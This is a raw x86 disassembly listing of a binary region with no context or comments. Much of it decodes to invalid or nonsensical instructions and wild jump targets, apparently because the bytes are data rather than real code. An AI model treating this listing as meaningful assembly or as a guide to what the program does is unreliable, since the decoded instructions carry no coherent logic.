  40fc13:	icebp  
  40fc14:	shl    edx,0xf2
  40fc17:	(bad)  
  40fc18:	mov    ah,0x16
  40fc1a:	push   eax
  40fc1b:	jne    0x40fbb0
  40fc1d:	mov    ecx,DWORD PTR [edi]
  40fc1f:	in     al,dx
  40fc20:	jmp    0x40fc13
  40fc22:	add    dl,dh
  40fc24:	mov    edi,esi
  40fc26:	or     al,0x8
  40fc28:	inc    ebp
  40fc29:	jne    0x40fc2e
  40fc2b:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fc31:	ret    
  40fc32:	or     bh,bh
  40fc34:	jge    0x40fc1e
  40fc36:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fc3c:	xor    edi,eax
  40fc3e:	add    esi,DWORD PTR [ebp-0x77]
  40fc41:	mov    ebx,esp
  40fc43:	clc    
  40fc44:	neg    DWORD PTR [ebp-0x7c]
  40fc47:	xor    eax,DWORD PTR [eax]
  40fc49:	cmp    eax,DWORD PTR [eax]
  40fc4b:	repz jne 0x40fbe3
  40fc4e:	xor    eax,DWORD PTR [ecx]
  40fc50:	add    ebx,DWORD PTR [eax]
  40fc52:	mov    DWORD PTR [ebp-0x8],eax
  40fc55:	mov    eax,edi
  40fc57:	cld    
  40fc58:	lock pop eax
  40fc5a:	test   DWORD PTR [ebx],esi
  40fc5c:	clc    
  40fc5d:	add    edx,DWORD PTR [edi-0x740bff77]
  40fc63:	fdivp  st(4),st
  40fc65:	test   ecx,esi
  40fc67:	(bad)  
  40fc68:	jnp    0x40fc69
  40fc6a:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fc70:	jae    0x40fbfd
  40fc72:	sub    edi,esp
  40fc74:	(bad)  
  40fc75:	shl    DWORD PTR [eax-0x3e],0x89
  40fc79:	leave  
  40fc7a:	call   0x8196b387
  40fc7f:	in     al,dx
  40fc80:	(bad)  
  40fc81:	in     al,dx
  40fc82:	add    bh,al
  40fc84:	mov    esp,edi
  40fc86:	in     al,dx
  40fc87:	test   DWORD PTR [ebp-0x8],edi
  40fc8a:	mov    eax,DWORD PTR [ebp+0x2b]
  40fc8d:	xor    al,BYTE PTR [ebx]
  40fc8f:	pushf  
  40fc90:	jnp    0x572ff8c9
  40fc96:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  40fc9a:	loopne 0x40fccf
  40fc9c:	jne    0x40fc59
  40fc9e:	mov    esi,DWORD PTR [edx-0x20]
  40fca1:	add    BYTE PTR [ebp-0x3d],bh
  40fca4:	xor    eax,DWORD PTR [ebp-0x73]
  40fca7:	mov    edi,DWORD PTR [esi]
  40fca9:	cld    
  40fcaa:	jb     0x40fc72
  40fcac:	add    bl,al
  40fcae:	jne    0x40fcf5
  40fcb0:	mov    edx,DWORD PTR [edi-0x10]
  40fcb3:	jge    0x40fd32
  40fcb5:	mov    esi,DWORD PTR [ebx]
  40fcb7:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fcbb:	xor    esi,DWORD PTR [ebp-0x77]
  40fcbe:	mov    esi,eax
  40fcc0:	lock inc ebp
  40fcc2:	jge    0x40fcf5
  40fcc4:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fccb:	dec    ebp
  40fccc:	mov    esi,DWORD PTR [ebx]
  40fcce:	loopne 0x40fc59
  40fcd0:	jge    0x40fcca
  40fcd2:	add    DWORD PTR [ebp-0x7d],eax
  40fcd5:	icebp  
  40fcd6:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fcdd:	dec    ebp
  40fcde:	hlt    
  40fcdf:	xor    ebx,DWORD PTR [ebp-0x77]
  40fce2:	mov    esi,esp
  40fce4:	in     al,0x45
  40fce6:	jge    0x40fd25
  40fce8:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fcef:	dec    ebp
  40fcf0:	push   esp
  40fcf1:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  40fcf7:	inc    ebp
  40fcf8:	hlt    
  40fcf9:	xor    DWORD PTR [ebp-0x61],esi
  40fcfc:	mov    edi,DWORD PTR [eax+0xf19504]
  40fd02:	repnz mov DWORD PTR [ebp+0x20],ebx
  40fd06:	cmp    eax,DWORD PTR [ebp+0xf]
  40fd09:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fd0d:	fistp  WORD PTR [ebx+0x0]
  40fd10:	inc    ebp
  40fd11:	mov    ebx,DWORD PTR [edi+0xc]
  40fd14:	add    eax,eax
  40fd16:	inc    ebp
  40fd17:	test   BYTE PTR [ebx],dh
  40fd19:	add    eax,DWORD PTR [ebx]
  40fd1b:	add    BYTE PTR [esi+0x45],bl
  40fd1e:	ret    0x85
  40fd21:	jnp    0x544180f0
  40fd27:	inc    bp
  40fd29:	inc    ebp
  40fd2a:	xor    DWORD PTR [ecx+0xc78a9c],edi
  40fd30:	fdiv   QWORD PTR [ebx]
  40fd32:	test   DWORD PTR [ecx+0x453bf8],edi
  40fd38:	push   ebx
  40fd39:	add    edi,DWORD PTR [esi+0x708088b]
  40fd3f:	cmp    esi,eax
  40fd41:	setnp  BYTE PTR [ecx-0x74fcffce]
  40fd48:	mov    esp,edi
  40fd4a:	call   0x33cc429c
  40fd4f:	or     BYTE PTR [ebx],al
  40fd51:	inc    ecx
  40fd52:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40fd58:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fd5e:	lock add cl,al
  40fd61:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fd68:	mov    ch,0x45
  40fd6a:	clc    
  40fd6b:	xor    eax,DWORD PTR [ebp+0x3]
  40fd6e:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fd74:	inc    ebp
  40fd75:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fd7b:	mov    edi,eax
  40fd7d:	mov    eax,DWORD PTR [ebp+0x3c]
  40fd80:	mov    ecx,DWORD PTR [eax]
  40fd82:	hlt    
  40fd83:	inc    ebp
  40fd84:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40fd8b:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fd91:	push   ebp
  40fd92:	mov    edi,DWORD PTR [ebx]
  40fd94:	in     al,dx
  40fd95:	jne    0x40fd58
  40fd97:	mov    eax,DWORD PTR [ebp-0x28]
  40fd9a:	add    DWORD PTR [eax],0xe8058dec
  40fda0:	clc    
  40fda1:	mov    esi,DWORD PTR [edi-0x8]
  40fda4:	add    dh,dl
  40fda6:	rol    WORD PTR [ebp-0x1],cl
  40fdaa:	mov    edx,DWORD PTR [eax+0x8]
  40fdad:	jne    0x40fd6f
  40fdaf:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40fdb6:	inc    ebp
  40fdb7:	push   esp
  40fdb8:	test   DWORD PTR [ecx+0xf],ecx
  40fdbb:	sub    edx,esp
  40fdbd:	add    eax,DWORD PTR [eax]
  40fdbf:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40fdc5:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40fdcc:	mov    eax,DWORD PTR [ecx]
  40fdce:	and    BYTE PTR [eax],al
  40fdd0:	cmp    al,0x10
  40fdd2:	add    BYTE PTR [ebp+0x66],al
  40fdd5:	inc    ecx
  40fdd7:	push   esp
  40fdd8:	add    dh,BYTE PTR [ebp+0x0]
  40fddb:	push   edx
  40fddc:	enterw 0xc1,0x4d
  40fde1:	mov    esp,DWORD PTR [esi+0x20]
  40fde4:	add    DWORD PTR [ecx-0x7b],eax
  40fde7:	add    eax,DWORD PTR [ebx]
  40fde9:	str    WORD PTR [eax+0x45]
  40fded:	lea    ecx,[ebx+0x45890801]
  40fdf3:	sbb    BYTE PTR [ebx],al
  40fdf5:	dec    ebp
  40fdf6:	cmp    al,0xf
  40fdf8:	inc    ebp
  40fdf9:	push   eax
  40fdfa:	mov    esi,DWORD PTR [ebx]
  40fdfc:	push   eax
  40fdfd:	add    eax,eax
  40fdff:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40fe06:	inc    ebp
  40fe07:	add    BYTE PTR [ecx],dh
  40fe09:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  40fe10:	(bad)  
  40fe11:	mov    ebx,eax
  40fe13:	loopne 0x40fe5a
  40fe15:	dec    ebp
  40fe16:	mov    ecx,DWORD PTR [edi]
  40fe18:	cld    
  40fe19:	push   eax
  40fe1a:	xchg   DWORD PTR [ebx],esi
  40fe1c:	add    DWORD PTR [ebx],ebp
  40fe1e:	add    BYTE PTR [ebx],ch
  40fe20:	or     BYTE PTR [ecx],bh
  40fe22:	dec    ecx
  40fe23:	loopne 0x40fe28
  40fe25:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40fe2b:	push   ebp
  40fe2c:	add    DWORD PTR [ebx+0x55100800],eax
  40fe32:	dec    ebp
  40fe33:	jmp    0x40fdbe
  40fe35:	mov    esp,DWORD PTR [eax]
  40fe37:	sbb    dl,dl
  40fe39:	inc    eax
  40fe3a:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40fe40:	add    BYTE PTR [ebx+0x74528555],cl
  40fe46:	push   ebp
  40fe47:	div    DWORD PTR [ebx]
  40fe49:	and    eax,DWORD PTR [ebx]
  40fe4b:	add    edx,DWORD PTR [edx-0x30]
  40fe4e:	jno    0x40fddb
  40fe50:	inc    DWORD PTR [eax+eiz*1]
  40fe53:	inc    ebp
  40fe54:	push   eax
  40fe55:	push   eax
  40fe56:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40fe5c:	mov    edi,esp
  40fe5e:	push   eax
  40fe5f:	inc    ebp
  40fe60:	enter  0x458b,0x8
  40fe64:	push   ecx
  40fe65:	(bad)  
  40fe66:	call   0x10b083e
  40fe6b:	pop    ss
  40fe6c:	push   ebp
  40fe6d:	mov    ecx,DWORD PTR [ebx+0x489408]
  40fe73:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40fe79:	push   ecx
  40fe7a:	jo     0x40fe64
  40fe7c:	inc    DWORD PTR [edi]
  40fe7e:	or     BYTE PTR [eax],al
  40fe80:	call   0xcc05ca
  40fe85:	fmul   QWORD PTR [ebp+0x55]
  40fe88:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fe8e:	mov    bh,0x8c
  40fe90:	adc    al,0x9b
  40fe92:	dec    esp
  40fe93:	xor    bl,BYTE PTR [eax]
  40fe95:	mov    ecx,DWORD PTR [ebp+0xc]
  40fe98:	mov    eax,DWORD PTR [ebp-0x4]
  40fe9b:	mov    esi,DWORD PTR [edi-0x3148f924]
  40fea1:	push   es
  40fea2:	retf   
  40fea3:	mov    BYTE PTR [ebp-0x30],0x3b
  40fea7:	inc    ebp
  40fea8:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  40feaf:	retf   0x83fc
  40feb2:	into   
  40feb3:	dec    ebp
  40feb4:	retf   
  40feb5:	mov    ecx,DWORD PTR [ebp-0x74]
  40feb8:	mov    eax,DWORD PTR [eax]
  40feba:	fdiv   QWORD PTR [ebx]
  40febc:	mov    bh,0x3
  40febe:	push   es
  40febf:	mov    esi,ecx
  40fec1:	sbb    cl,dl
  40fec3:	dec    ebp
  40fec4:	sar    DWORD PTR [ebx],cl
  40fec6:	push   ebp
  40fec7:	jne    0x40fed8
  40fec9:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  40fecf:	lea    ebx,[eax]
  40fed1:	call   0xf4ca8a98
  40fed6:	sbb    dh,dl
  40fed8:	add    edx,ebx
  40feda:	push   ebp
  40fedb:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  40fee1:	push   ecx
  40fee2:	mov    DWORD PTR [eax-0x30],edx
  40fee5:	test   DWORD PTR [edx],eax
  40fee7:	xadd   esp,esi
  40feea:	pop    es
  40feeb:	add    cl,dl
  40feed:	mov    eax,ecx
  40feef:	or     al,0x45
  40fef1:	(bad)  
  40fef2:	push   eax
  40fef3:	add    DWORD PTR [edx+0x0],eax
  40fef6:	add    ecx,DWORD PTR [ecx]
  40fef8:	and    dh,cl
  40fefa:	call   0xc507ca
  40feff:	add    DWORD PTR [ebp+0x0],edx
  40ff02:	mov    esp,DWORD PTR [ebp+0x18]
  40ff05:	add    BYTE PTR [eax+0x50],cl
  40ff08:	xor    eax,DWORD PTR [eax]
  40ff0a:	add    esp,DWORD PTR [esi+0x3b]
  40ff0d:	inc    ebp
  40ff0e:	je     0x40fe93
  40ff10:	push   ecx
  40ff11:	dec    BYTE PTR [ebp-0x77]
  40ff14:	add    eax,esi
  40ff16:	or     al,0x5e
  40ff18:	inc    eax
  40ff19:	add    BYTE PTR [ebx],al
  40ff1b:	data16 and BYTE PTR [ebp+0x50],al
  40ff1f:	sub    DWORD PTR [ecx],0xfffffff8
  40ff22:	add    BYTE PTR [ebp-0x75],ah
  40ff25:	add    BYTE PTR [eax],bl
  40ff27:	enter  0x894d,0x8b
  40ff2b:	int3   
  40ff2c:	loopne 0x40fef0
  40ff2e:	rol    BYTE PTR [eax],0x33
  40ff31:	lea    cx,[ebp+0xa]
  40ff35:	data16 jb 0x40ff7d
  40ff38:	add    BYTE PTR [ebx+0x44890855],cl
  40ff3e:	sbb    ah,al
  40ff40:	inc    ebp
  40ff41:	cmp    al,0xf
  40ff43:	add    BYTE PTR [edx+0x66],dl
  40ff46:	xor    ecx,DWORD PTR [eax]
  40ff48:	sub    eax,DWORD PTR [edx]
  40ff4a:	mov    eax,DWORD PTR [eax]
  40ff4c:	or     al,0x66
  40ff4e:	ror    edx,cl
  40ff50:	dec    ebp
  40ff51:	inc    ebp
  40ff52:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  40ff58:	cld    
  40ff59:	or     BYTE PTR [edi+0x4501dd],dl
  40ff5f:	ret    0xecce
  40ff62:	retf   
  40ff63:	(bad)  
  40ff64:	dec    ebp
  40ff65:	mov    al,0x8b
  40ff67:	loopne 0x40ff89
  40ff69:	cmp    ecx,DWORD PTR [edx]
  40ff6b:	inc    ebp
  40ff6c:	daa    
  40ff6d:	loopne 0x40fef6
  40ff6f:	in     al,dx
  40ff70:	add    edi,eax
  40ff72:	add    BYTE PTR [eax+0x3f52e155],bh
  40ff78:	push   ebp
  40ff79:	inc    ebp
  40ff7a:	xor    ebx,edx
  40ff7c:	add    ebp,esp
  40ff7e:	push   edx
  40ff7f:	push   bp
  40ff81:	inc    ebp
  40ff82:	(bad)  
  40ff83:	in     eax,dx
  40ff84:	push   esp
  40ff85:	(bad)  
  40ff86:	inc    edx
  40ff88:	sbb    al,0x33
  40ff8a:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  40ff91:	add    BYTE PTR [ebp+0x46],0x8b
  40ff95:	jmp    0xf98b:0x100041c8
  40ff9c:	xor    esi,DWORD PTR [edx+0x3]
  40ff9f:	mov    ecx,DWORD PTR [edi]
  40ffa1:	fmul   DWORD PTR [edx]
  40ffa3:	add    BYTE PTR [eax],al
  40ffa5:	lea    eax,[ebx-0x4700273c]
  40ffab:	add    al,0x4f
  40ffad:	pop    DWORD PTR [eax]
  40ffaf:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  40ffb5:	push   edx
  40ffb6:	inc    WORD PTR [ebp+0x8]
  40ffba:	mov    eax,0x514f4d
  40ffbf:	(bad)
  40ffc3:	add    al,al
  40ffc5:	xor    DWORD PTR [ebx-0x74baf730],eax
  40ffcb:	test   DWORD PTR [esi+0x74],esp
  40ffce:	inc    ebp
  40ffcf:	mov    DWORD PTR [eax+0xa4e08],edi
  40ffd5:	add    BYTE PTR [ecx-0x76c435bb],cl
  40ffdb:	or     dh,cl
  40ffdd:	or     eax,0x8b8d5045
  40ffe2:	inc    ebp
  40ffe3:	mov    WORD PTR [ecx+0x3b8a00],?
  40ffe9:	jne    0x41001e
  40ffeb:	mov    edi,DWORD PTR [edx+0x8f3b18]
  40fff1:	add    DWORD PTR [ebx],eax
  40fff3:	add    bh,bh
  40fff5:	adc    DWORD PTR [eax],ecx
  40fff7:	adc    DWORD PTR [ebp+0x55],edi
  40fffa:	push   es
  40fffb:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410001:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  410008:	inc    ebp
  410009:	mov    esp,edi
  41000b:	or     al,0xda
  41000d:	push   eax
  41000e:	(bad)  
  41000f:	jne    0x40ffc5
  410011:	call   0x38f900
  410016:	inc    ebp
  410017:	sar    BYTE PTR [eax],0x84
  41001a:	in     al,dx
  41001b:	add    bh,al
  41001d:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  410024:	(bad)  
  410025:	and    al,al
  410027:	fs in  eax,dx
  410029:	inc    DWORD PTR [ebp-0x7b]
  41002c:	jle    0x41003d
  41002e:	leave  
  41002f:	scas   al,BYTE PTR es:[edi]
  410030:	inc    esp
  410031:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  410038:	or     BYTE PTR [ebx-0x97717c8],0x83
  41003f:	call   DWORD PTR [edi]
  410041:	shr    ah,0x84
  410044:	xchg   DWORD PTR [eax],eax
  410046:	add    DWORD PTR [eax],eax
  410048:	add    bh,bh
  41004a:	dec    ebp
  41004b:	and    BYTE PTR [ecx-0x38],dl
  41004e:	push   eax
  41004f:	dec    DWORD PTR [ebx+0xfd885]
  410055:	mov    BYTE PTR [ebp+0x508bac00],cl
  41005b:	mov    WORD PTR [ecx+0x0],ss
  41005e:	lea    ecx,[ebx+0x108b20d8]
  410064:	mov    WORD PTR [edx],ds
  410066:	add    BYTE PTR [edi+0xff01ff],al
  41006c:	mov    ecx,DWORD PTR [ebp-0x28]
  41006f:	push   ecx
  410070:	shl    BYTE PTR [ebp+0x3a],0x8b
  410074:	inc    ebp
  410075:	in     al,0xeb
  410077:	jno    0x410004
  410079:	push   edx
  41007a:	mov    DWORD PTR [eax-0x28],edx
  41007d:	mov    eax,DWORD PTR [ebp+0x20]
  410080:	je     0x410009
  410082:	mov    eax,DWORD PTR [ecx]
  410084:	sbb    BYTE PTR [eax],al
  410086:	pop    DWORD PTR [eax]
  410088:	add    esi,eax
  41008a:	add    bl,al
  41008c:	adc    DWORD PTR [edi],esi
  41008e:	jmp    0x8bcc50e0
  410093:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  41009a:	jne    0x410027
  41009c:	mov    ecx,DWORD PTR [eax]
  41009e:	in     al,0x75
  4100a0:	pop    DWORD PTR [ecx+0x5401]
  4100a6:	push   edx
  4100a7:	inc    DWORD PTR [ebx]
  4100a9:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4100af:	add    BYTE PTR [edi+0x9],dl
  4100b2:	call   DWORD PTR [esi]
  4100b4:	and    dl,al
  4100b6:	and    bh,bh
  4100b8:	inc    edi
  4100ba:	test   eax,edx
  4100bc:	sldt   ebx
  4100bf:	xor    al,BYTE PTR [eax]
  4100c1:	pushf  
  4100c2:	(bad)  
  4100c3:	jmp    0x4100d1
  4100c5:	mov    eax,edi
  4100c7:	or     al,0x75
  4100c9:	inc    eax
  4100ca:	call   0x40f7d2
  4100cf:	mov    eax,eax
  4100d1:	loopne 0x410057
  4100d3:	inc    ebp
  4100d4:	add    BYTE PTR [ebx+0x1451c00],cl
  4100da:	mov    eax,DWORD PTR [ebp+0x20]
  4100dd:	add    edi,ecx
  4100df:	add    BYTE PTR [eax],ch
  4100e1:	cmp    edi,0x18
  4100e4:	test   DWORD PTR [ebp+0xf],esi
  4100e7:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4100ee:	jne    0x4100f2
  4100f0:	call   0xff9ffbb5
  4100f5:	leave  
  4100f6:	rcr    BYTE PTR [esp+eax*4],0x55
  4100fa:	add    ah,ch
  4100fc:	add    BYTE PTR [edi-0x48fef979],dh
  410102:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  410109:	inc    esp
  41010a:	mov    ebx,DWORD PTR [eax]
  41010c:	fcom   st(2)
  41010e:	add    BYTE PTR [edi],bl
  410110:	lea    ecx,[eax-0x18]
  410113:	(bad)  
  410114:	push   DWORD PTR [ecx]
  410116:	call   0xffb34e78
  41011b:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  41011f:	fstp   DWORD PTR [esi+ebx*8]
  410122:	push   ebp
  410123:	pop    ebp
  410124:	mov    esi,DWORD PTR [edx-0x38]
  410127:	add    DWORD PTR [eax],0x28
  41012a:	mov    edi,DWORD PTR [ebx]
  41012c:	xor    esi,DWORD PTR [edx+0x3]
  41012f:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410133:	pop    ebp
  410134:	or     al,0x4
  410136:	inc    ecx
  410137:	push   ebp
  410138:	(bad)  
  410139:	in     al,dx
  41013a:	or     ah,ch
  41013c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013d:	xbegin 0xffc67733
  410143:	clc    
  410144:	adc    al,0x45
  410146:	div    BYTE PTR [edx]
  410148:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  41014f:	test   DWORD PTR [ebx+0x666300f8],ebx
  410155:	add    BYTE PTR [ecx+0x66],dh
  410158:	add    eax,DWORD PTR [ebp+0x52]
  41015b:	adc    eax,0xffffffa0
  41015e:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  410164:	test   DWORD PTR [eax],eax
  410166:	clc    
  410167:	data16 or al,BYTE PTR [ebp+0x45]
  41016b:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  410172:	rol    BYTE PTR [ebp+0x45],1
  410175:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  41017b:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  410181:	push   ebx
  410182:	add    BYTE PTR [eax+eax*1+0x51],dl
  410186:	jge    0x4101bb
  410188:	add    BYTE PTR [esi+0x4],dl
  41018b:	jne    0x4101f2
  41018d:	mov    edx,0x457200
  410192:	jmp    0x410156
  410194:	xor    edi,DWORD PTR [ebx]
  410196:	pop    edi
  410197:	cvtdq2ps xmm7,xmm0
  41019a:	ret    0x0
  41019d:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4101a3:	xor    ecx,DWORD PTR [edi]
  4101a5:	add    eax,DWORD PTR [ecx+0x3b]
  4101a8:	push   ebx
  4101a9:	rdpmc  
  4101ab:	out    0x8d,al
  4101ad:	add    BYTE PTR [eax],cl
  4101af:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4101b5:	ret    0x450c
  4101b8:	sbb    al,0x8b
  4101ba:	cmp    eax,esi
  4101bc:	or     cl,al
  4101be:	or     al,0xc2
  4101c0:	pop    eax
  4101c1:	inc    ebp
  4101c2:	add    ecx,DWORD PTR [edi]
  4101c4:	add    esi,DWORD PTR [ebp+0x39]
  4101c7:	invd   
  4101c9:	jge    0x4101d5
  4101cb:	mov    eax,0x478ac0
  4101d0:	cli    
  4101d1:	xor    esp,ecx
  4101d3:	mov    ebx,0x5b8ac0
  4101d8:	ret    0x33
  4101db:	mov    eax,0x833b8b
  4101e0:	sub    BYTE PTR [ebx],al
  4101e2:	inc    ebp
  4101e3:	xor    ax,di
  4101e6:	pushf  
  4101e7:	inc    bh
  4101e9:	mov    esp,esp
  4101eb:	hlt    
  4101ec:	test   DWORD PTR [ebp-0x8],esi
  4101ef:	mov    eax,DWORD PTR [ebp-0x14]
  4101f2:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4101f8:	dec    edi
  4101f9:	or     BYTE PTR [eax],al
  4101fb:	jne    0x410186
  4101fd:	mov    esi,esp
  4101ff:	call   0x77a78dc4
  410204:	inc    ebp
  410205:	mov    DWORD PTR [eax+0x9b4f0c],edi
  41020b:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410211:	add    BYTE PTR [esi+0x7d],ah
  410214:	inc    ebp
  410215:	mov    bx,WORD PTR [ebp+0x8]
  410219:	add    DWORD PTR [ebp+0x54],0x30c008b
  410220:	inc    ebp
  410221:	mov    bx,di
  410224:	lock test BYTE PTR [ecx+0x7000801],bh
  41022b:	jge    0x4101ee
  41022d:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  410233:	cli    
  410234:	xor    bl,bh
  410236:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41023c:	test   BYTE PTR [eax],cl
  41023e:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  410245:	cmp    ebp,eax
  410247:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  41024e:	test   BYTE PTR [ebp+0x1],bh
  410251:	mov    ebx,0x458a00
  410256:	xor    esi,DWORD PTR [ebx]
  410258:	add    esp,DWORD PTR [esi-0x77]
  41025b:	pop    ebp
  41025c:	loopne 0x4102c4
  41025e:	inc    ebp
  41025f:	clc    
  410260:	xor    edi,DWORD PTR [ebx]
  410262:	add    esi,DWORD PTR [edx-0x77]
  410265:	data16 fdivr QWORD PTR [ebp-0x49]
  410269:	mov    ebx,0xb78afc
  41026e:	hlt    
  41026f:	xor    edi,DWORD PTR [esi+eiz*2]
  410272:	add    BYTE PTR [ebp+0x66],bl
  410275:	data16 lock clc 
  410278:	cmp    al,0x3b
  41027a:	add    BYTE PTR [edi+0x66],dh
  41027d:	psubq  mm7,QWORD PTR [ebp+0x2]
  410281:	ltr    WORD PTR [ebp+0x66]
  410285:	add    esi,eax
  410287:	add    di,WORD PTR [ebp+0x2b]
  41028b:	data16 data16 jge 0x41030c
  41028f:	mov    ebx,0xe08a8b
  410294:	jge    0x4102c9
  410296:	data16 data16 xor al,0x5d
  41029a:	data16 data16 jne 0x410296
  41029e:	mov    edi,DWORD PTR [ebx]
  4102a0:	fdiv   QWORD PTR [edx+0x7d]
  4102a3:	data16 data16 jge 0x4102db
  4102a7:	mov    ebx,0x758a66
  4102ac:	mov    esi,0x667233
  4102b1:	pop    ebp
  4102b2:	or     BYTE PTR [esi+0x0],ah
  4102b5:	clc    
  4102b6:	mov    edi,DWORD PTR [ebx]
  4102b8:	lock ja 0x410246
  4102bb:	(bad)  
  4102bd:	jge    0x4102b6
  4102bf:	invd   
  4102c1:	pop    ebp
  4102c2:	add    BYTE PTR [ebx],al
  4102c4:	(bad)  
  4102c5:	cmp    di,WORD PTR [ebp+0xf]
  4102c9:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4102cd:	mov    bx,WORD PTR [ebp-0x10]
  4102d1:	pop    bp
  4102d3:	fbstp  TBYTE PTR [ebx]
  4102d5:	test   DWORD PTR [ebx],eax
  4102d7:	add    BYTE PTR [ebx],bh
  4102d9:	add    BYTE PTR [esi+0x7d],ah
  4102dc:	jge    0x410269
  4102de:	data16 in al,dx
  4102e0:	pop    ebp
  4102e1:	stc    
  4102e2:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4102e9:	mov    edi,ebx
  4102eb:	in     al,dx
  4102ec:	test   BYTE PTR [ebp+0x0],bh
  4102ef:	mov    eax,DWORD PTR [eax]
  4102f1:	call   0xbd3dfc81
  4102f6:	cmp    al,0x9b
  4102f8:	add    BYTE PTR [edx],dh
  4102fa:	mov    bx,di
  4102fd:	call   0x8b49808d
  410302:	add    ebp,esp
  410304:	mov    bx,di
  410307:	jnp    0x41032f
  410309:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  41030f:	mov    eax,DWORD PTR [eax]
  410311:	call   0x7c3c8e7c
  410316:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41031c:	data16 data16 fistp WORD PTR [ebp+0xe]
  410321:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  41032b:	fisttp WORD PTR [ecx-0x7401f77b]
  410331:	(bad)  
  410332:	cld    
  410333:	jne    0x410371
  410335:	xor    eax,DWORD PTR [eax]
  410337:	mov    esp,DWORD PTR [esi-0x10]
  41033a:	sti    
  41033b:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  410342:	data16 adc bl,bh
  410345:	push   ebp
  410346:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  41034d:	mov    WORD PTR [eax],es
  41034f:	fwait
  410350:	data16 xor bh,bl
  410353:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  410359:	mov    esp,DWORD PTR [esi-0x14]
  41035c:	fisttp WORD PTR [ebx-0x3748a9f2]
  410362:	or     al,0x2b
  410364:	mov    bh,0xba
  410366:	hlt    
  410367:	mov    bh,bl
  410369:	add    BYTE PTR [ecx-0x7446f3cd],cl
  41036f:	dec    esi
  410370:	or     al,0x0
  410372:	mov    edi,DWORD PTR [ebx]
  410374:	or     BYTE PTR [ebp+0x3b],dh
  410377:	mov    ecx,DWORD PTR [edi]
  410379:	fdivr  QWORD PTR [ebx-0x7499ff83]
  41037f:	xor    al,0xd8
  410381:	pop    bp
  410383:	lock xor esi,DWORD PTR [ebx]
  410386:	lea    esp,[esi+0x1f]
  410389:	icebp  
  41038a:	jb     0x410390
  41038c:	add    al,al
  41038e:	jge    0x41039c
  410390:	mov    eax,eax
  410392:	fsubr  st,st(3)
  410394:	pop    ebp
  410395:	mov    esi,DWORD PTR [ebx]
  410397:	in     al,0x8d
  410399:	rcr    DWORD PTR [edi],0xc2
  41039c:	jb     0x4103fc
  41039e:	add    cl,cl
  4103a0:	jge    0x4103ae
  4103a2:	mov    edx,DWORD PTR [ebp-0x20]
  4103a5:	in     al,dx
  4103a6:	pop    ebp
  4103a7:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4103ac:	cmp    di,WORD PTR [ebp+0x0]
  4103b0:	mov    ebp,DWORD PTR [ebx]
  4103b2:	fdivr  QWORD PTR [esi+0x668a5d]
  4103b8:	cmp    al,0x33
  4103ba:	mov    si,0x4e7d
  4103be:	mov    eax,DWORD PTR [eax]
  4103c0:	lock inc ebp
  4103c2:	mov    esi,DWORD PTR [eax]
  4103c4:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
